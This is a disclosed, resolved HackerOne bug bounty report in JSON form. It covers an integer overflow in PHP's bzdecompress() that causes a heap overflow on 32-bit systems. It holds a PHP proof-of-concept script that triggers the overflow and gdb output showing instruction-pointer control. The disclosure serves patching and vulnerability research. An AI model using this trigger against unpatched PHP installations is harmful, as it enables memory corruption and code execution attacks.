{"id":180563,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA1NjM=","url":"https://hackerone.com/reports/180563","title":"Heap overflow due to integer overflow in bzdecompress() function","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-11-07T02:05:13.928Z","submitted_at":"2016-11-07T02:05:13.928Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fosec","url":"/fosec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:21:52.975Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:21:44.397Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The fix for this bug has been committed: https://bugs.php.net/bug.php?id=73386\nDescription:\n------------\nI have found some vulnerable code at ```bzdecompress()``` function in module Bzip2. ```bzdecompress() function``` creates a new zend_string object to store decompressed data. The size of destination string depends on the size of source string. ( refer at ```ext/bz2/bz2.c:589``` )\n\n``` c\nstatic PHP_FUNCTION(bzdecompress)\n{\n....\n\tbzs.avail_in = source_len;\n\t/* in most cases bz2 offers at least 2:1 compression, so we use that as our base */\n\tbzs.avail_out = source_len * 2;\n\tdest = zend_string_alloc(bzs.avail_out + 1, 0);\n....\n}\n```\n\nIf compressed string is too long, ```bzs.avail_out``` will be an unexpected value and ```zend_string_alloc()``` function will allocate a small memory range. Due to missing check of size before calling\n```zend_string_alloc()```, this new memory range can not use to store large decompressed data and lead to heap overflow. The overflow results as arbitrary code execution, I can control eip register to the arbitrary value. This bug is only triggered in 32bit machine.\n\nTest script:\n---------------\n``` php\n\u003c?php\nini_set('memory_limit', -1);\n$s = str_repeat('A', 0xE3AC).\"BBBB\".str_repeat('C', 0x1C50);\n$a = bzcompress($s);\n$a = $a.str_repeat('A', 4634 - strlen($a));\n$a = str_repeat($a, 0x7ffffffe / strlen($a)); // try to create a compressed data with large size\nbzdecompress($a); // trigger this vulnerability\n?\u003e\n```\nActual result:\n--------------\n```\n[root@local PHP-7.1]# gdb --args sapi/cli/php -f ../crash/bz_poc.php\n\n[----------------------------------registers-----------------------------------]\nEAX: 0x0\nEBX: 0x1\nECX: 0xffffff60\nEDX: 0x7fff\nESI: 0xb7813020 --\u003e 0xb78743f0 ('A' \u003crepeats 28 times\u003e, \"BBBB\", 'C' \u003crepeats 168 times\u003e...)\nEDI: 0xb787440c (\"BBBB\", 'C' \u003crepeats 196 times\u003e...)\nEBP: 0xbfffc094 --\u003e 0x0\nESP: 0xbfffbffc --\u003e 0x835fd02 (\u003cexecute_ex+34\u003e: test   edi,edi)\nEIP: 0x42424242 --\u003e 0x2478184\nEFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n=\u003e 0x42424242:  test   BYTE PTR [ecx+0x60380247],al\n   0x42424248:  inc    ecx\n   0x42424249:  inc    ecx\n   0x4242424a:  inc    ecx\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbffc --\u003e 0x835fd02 (\u003cexecute_ex+34\u003e:        test   edi,edi)\n0004| 0xbfffc000 --\u003e 0xbfffc094 --\u003e 0x0\n0008| 0xbfffc004 --\u003e 0xb7864180 --\u003e 0x2\n0012| 0xbfffc008 --\u003e 0x0\n0016| 0xbfffc00c --\u003e 0x83aed9b (\u003czend_execute+315\u003e:     mov    edx,DWORD PTR [esp+0x18])\n0020| 0xbfffc010 --\u003e 0xb7813020 --\u003e 0xb78743f0 ('A' \u003crepeats 28 times\u003e, \"BBBB\", 'C' \u003crepeats 168 times\u003e...)\n0024| 0xbfffc014 --\u003e 0x0\n0028| 0xbfffc018 --\u003e 0x1c\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x42424242 in ?? ()\ngdb-peda$ i r eip\neip            0x42424242       0x42424242\ngdb-peda$\n```\nEIP is controlled as **0x42424242**, from the input **\"BBBB\"**.","vulnerability_information_html":"\u003cp\u003eThe fix for this bug has been committed: \u003ca title=\"https://bugs.php.net/bug.php?id=73386\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73386\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=73386\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription:\u003c/h2\u003e\n\n\u003cp\u003eI have found some vulnerable code at \u003ccode\u003ebzdecompress()\u003c/code\u003e function in module Bzip2. \u003ccode\u003ebzdecompress() function\u003c/code\u003e creates a new zend_string object to store decompressed data. The size of destination string depends on the size of source string. ( refer at \u003ccode\u003eext/bz2/bz2.c:589\u003c/code\u003e )\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"nf\"\u003ePHP_FUNCTION\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebzdecompress\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"p\"\u003e....\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ebzs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eavail_in\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esource_len\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"cm\"\u003e/* in most cases bz2 offers at least 2:1 compression, so we use that as our base */\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ebzs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eavail_out\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esource_len\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003edest\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ezend_string_alloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebzs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eavail_out\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e....\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf compressed string is too long, \u003ccode\u003ebzs.avail_out\u003c/code\u003e will be an unexpected value and \u003ccode\u003ezend_string_alloc()\u003c/code\u003e function will allocate a small memory range. Due to missing check of size before calling\u003cbr\u003e\n\u003ccode\u003ezend_string_alloc()\u003c/code\u003e, this new memory range can not use to store large decompressed data and lead to heap overflow. The overflow results as arbitrary code execution, I can control eip register to the arbitrary value. This bug is only triggered in 32bit machine.\u003c/p\u003e\n\n\u003ch2 id=\"test-script\"\u003eTest script:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eini_set\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;memory_limit\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xE3AC\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;BBBB\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;C\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mh\"\u003e0x1C50\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ebzcompress\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$s\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$a\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4634\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nb\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_repeat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mh\"\u003e0x7ffffffe\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"nb\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e \u003cspan class=\"c1\"\u003e// try to create a compressed data with large size\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ebzdecompress\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// trigger this vulnerability\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"actual-result\"\u003eActual result:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[root@local PHP-7.1]# gdb --args sapi/cli/php -f ../crash/bz_poc.php\n\n[----------------------------------registers-----------------------------------]\nEAX: 0x0\nEBX: 0x1\nECX: 0xffffff60\nEDX: 0x7fff\nESI: 0xb7813020 --\u0026gt; 0xb78743f0 (\u0026#39;A\u0026#39; \u0026lt;repeats 28 times\u0026gt;, \u0026quot;BBBB\u0026quot;, \u0026#39;C\u0026#39; \u0026lt;repeats 168 times\u0026gt;...)\nEDI: 0xb787440c (\u0026quot;BBBB\u0026quot;, \u0026#39;C\u0026#39; \u0026lt;repeats 196 times\u0026gt;...)\nEBP: 0xbfffc094 --\u0026gt; 0x0\nESP: 0xbfffbffc --\u0026gt; 0x835fd02 (\u0026lt;execute_ex+34\u0026gt;: test   edi,edi)\nEIP: 0x42424242 --\u0026gt; 0x2478184\nEFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n=\u0026gt; 0x42424242:  test   BYTE PTR [ecx+0x60380247],al\n   0x42424248:  inc    ecx\n   0x42424249:  inc    ecx\n   0x4242424a:  inc    ecx\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbffc --\u0026gt; 0x835fd02 (\u0026lt;execute_ex+34\u0026gt;:        test   edi,edi)\n0004| 0xbfffc000 --\u0026gt; 0xbfffc094 --\u0026gt; 0x0\n0008| 0xbfffc004 --\u0026gt; 0xb7864180 --\u0026gt; 0x2\n0012| 0xbfffc008 --\u0026gt; 0x0\n0016| 0xbfffc00c --\u0026gt; 0x83aed9b (\u0026lt;zend_execute+315\u0026gt;:     mov    edx,DWORD PTR [esp+0x18])\n0020| 0xbfffc010 --\u0026gt; 0xb7813020 --\u0026gt; 0xb78743f0 (\u0026#39;A\u0026#39; \u0026lt;repeats 28 times\u0026gt;, \u0026quot;BBBB\u0026quot;, \u0026#39;C\u0026#39; \u0026lt;repeats 168 times\u0026gt;...)\n0024| 0xbfffc014 --\u0026gt; 0x0\n0028| 0xbfffc018 --\u0026gt; 0x1c\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x42424242 in ?? ()\ngdb-peda$ i r eip\neip            0x42424242       0x42424242\ngdb-peda$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eEIP is controlled as \u003cstrong\u003e0x42424242\u003c/strong\u003e, from the input \u003cstrong\u003e\u0026quot;BBBB\u0026quot;\u003c/strong\u003e.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:21:44.460Z","allow_singular_disclosure_after":-35666601.71339826,"singular_disclosure_allowed":true,"vote_count":1,"voters":["spetr0x"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1339055,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:48:06.520Z","updated_at":"2016-12-03T20:48:06.520Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":11366},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339056,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:48:12.130Z","updated_at":"2016-12-03T20:48:12.130Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"fosec","url":"/fosec"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339057,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:48:16.533Z","updated_at":"2016-12-03T20:48:16.533Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"fosec","url":"/fosec"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025956,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:21:44.409Z","updated_at":"2019-10-13T09:21:44.409Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285699,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:21:52.991Z","updated_at":"2019-11-12T09:21:52.991Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}